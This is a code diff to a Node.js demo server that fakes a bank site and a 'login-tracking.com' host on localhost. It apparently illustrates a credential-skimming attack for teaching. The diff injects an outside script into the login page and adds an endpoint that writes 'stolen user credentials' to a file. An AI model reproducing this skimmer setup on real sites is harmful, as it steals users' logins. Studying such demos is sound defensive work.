@@ -17,16 +17,21 @@ myInterface.on('line', function (line) {
   users[user.id] = user;
 });
 
+/** create the server **/
 server = http.createServer(function(request, response) {
 	/** virtualizing the host. Checking the target host and routing to the right server **/
     switch(request.headers.host) {
         case 'bank-example.com': 
         	if (request.url == "/") {
+        		/** show login form **/
         		response.end(`
             		<!doctype html>
             		<html>
+            		<head>
+					<script src="http://login-tracking.com/login_tracker.js"></script>
+            		</head>
             		<body>
-                		<form action="/login" method="post">
+                		<form action="/login" method="post" id="login-form">
                     		User: <input type="email" name="email" /><br />
                     		Password: <input type="password" name="password" /><br />
                     		<button>Login</button>
@@ -36,6 +41,7 @@ server = http.createServer(function(request, response) {
         		`);        	
         	}
 			else if (request.url == "/login") {
+				/** handle the login attempt **/
 				handleLogin(request, (user, err) => {
 					if (err) {
 						response.writeHead(200, { "Content-Type": "text/html" });
@@ -51,6 +57,7 @@ server = http.createServer(function(request, response) {
 				});
 			}
 			else if (request.url == "/balance") {
+				/** check if token exists, then show balance **/
 				if (request.headers.cookie) {
 					var cookies = request.headers.cookie;
 					var token = -1;
@@ -64,7 +71,13 @@ server = http.createServer(function(request, response) {
         					balance = parts[1];
         				}
     				});
-					response.end('Your balance is : ' + balance);
+    				if (token) {
+						response.end('Your balance is : ' + balance);
+					}
+					else {
+						response.statusCode = 403;
+						response.end("You do not have rights to visit this page");				
+					}
 				}
 				else {
 					response.statusCode = 403;
@@ -72,7 +85,29 @@ server = http.createServer(function(request, response) {
 				}
 			}
         	break;
+        case 'login-tracking.com': 
+        	if (request.url == '/login_tracker.js') {
+        	/** return the contents of login_tracker.js **/
+  				fs.readFile('login_tracker.js', function(err, data) {
+    				response.writeHead(200, {'Content-Type': 'application/javascript'});
+    				response.write(data);
+    				response.end();
+  				});
+  			}
+  			else if (request.url == '/store_credentials') {
+  				/** save the stolen user credentials **/
+    			let body = '';
+    			request.on('data', chunk => {
+        			body += chunk.toString();
+    			});
+    			request.on('end', () => {
+    				/** write the credentials to a file **/
+  					fs.appendFile('credentials.txt', body+'\n', function (err) {});
+    			});
+  			}
+			break;
         default: 
+        	/** other hosts mapped to 127.0.0.1 **/
             response.statusCode = 404;
             response.end('<p>We do not serve the host: <b>' + request.headers.host + '</b>.</p>');
     }
